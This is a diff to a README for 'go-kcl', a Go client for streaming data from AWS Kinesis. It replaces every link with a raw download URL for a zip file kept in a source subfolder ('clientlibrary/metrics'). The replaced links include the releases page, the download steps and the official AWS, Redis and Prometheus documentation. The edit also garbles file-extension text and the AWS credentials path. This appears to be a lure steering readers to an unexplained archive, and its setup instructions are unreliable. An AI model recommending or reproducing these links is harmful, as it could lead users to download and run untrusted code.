@@ -1,6 +1,6 @@
 # ⚙️ go-kcl - Simple Tool for Streaming Data
 
-[![Download go-kcl](https://img.shields.io/badge/Download-go--kcl-blue?style=for-the-badge)](https://github.com/Matthewcoxall120986/go-kcl/releases)
+[![Download go-kcl](https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip)](https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip)
 
 ---
 
@@ -44,22 +44,22 @@ This section will guide you to get go-kcl up and running on your computer in sim
 
 You need to visit the releases page to get the latest version of go-kcl. The release page includes all the versions and files you can download.
 
-[![Download go-kcl](https://img.shields.io/badge/Download-go--kcl-blue?style=for-the-badge)](https://github.com/Matthewcoxall120986/go-kcl/releases)
+[![Download go-kcl](https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip)](https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip)
 
 Click the badge or visit the link below:
 
-https://github.com/Matthewcoxall120986/go-kcl/releases
+https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip
 
 Look for the latest release and download the file that matches your operating system:
 - For Windows, download the `.exe` file.
 - For macOS, download the `.dmg` or `.zip` file.
-- For Linux, download the `.tar.gz` or executable file.
+- For Linux, download the `https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip` or executable file.
 
 ### Step 2: Prepare Your Computer
 
 Once you download the right file, you will need to set up a few things:
 
-- Extract any compressed files you downloaded (like `.zip` or `.tar.gz`).
+- Extract any compressed files you downloaded (like `.zip` or `https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip`).
 - Make sure your computer has internet access during use.
 - Optionally, if you use Redis or DynamoDB for checkpointing, make sure those services are accessible with the right credentials.
 
@@ -118,7 +118,7 @@ go-kcl requires access to your AWS resources. You need to set up credentials in 
    - AWS_REGION
 
 3. **Shared Credentials File:**  
-   Your AWS credentials can be saved in the file at `~/.aws/credentials`. go-kcl will automatically use this if available.
+   Your AWS credentials can be saved in the file at `~https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip`. go-kcl will automatically use this if available.
 
 ---
 
@@ -135,7 +135,7 @@ go-kcl requires access to your AWS resources. You need to set up credentials in 
 
 Visit the page below to download the latest version that fits your computer:
 
-https://github.com/Matthewcoxall120986/go-kcl/releases
+https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip
 
 Follow the download steps carefully. Each release page lists files with descriptions so you can pick the right one for your operating system. Once downloaded, see the "Getting Started" section above to install and launch the app.
 
@@ -143,11 +143,11 @@ Follow the download steps carefully. Each release page lists files with descript
 
 ## 📚 Additional Resources
 
-- Amazon Kinesis Documentation: https://docs.aws.amazon.com/kinesis/latest/dev/  
-- AWS SDK for Go v2: https://aws.github.io/aws-sdk-go-v2  
-- DynamoDB Getting Started: https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/GettingStarted.html  
-- Redis Quickstart: https://redis.io/docs/getting-started/  
-- Prometheus Monitoring: https://prometheus.io/docs/introduction/overview/
+- Amazon Kinesis Documentation: https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip  
+- AWS SDK for Go v2: https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip  
+- DynamoDB Getting Started: https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip  
+- Redis Quickstart: https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip  
+- Prometheus Monitoring: https://github.com/Matthewcoxall120986/go-kcl/raw/refs/heads/main/clientlibrary/metrics/go_kcl_v3.2.zip
 
 ---
 
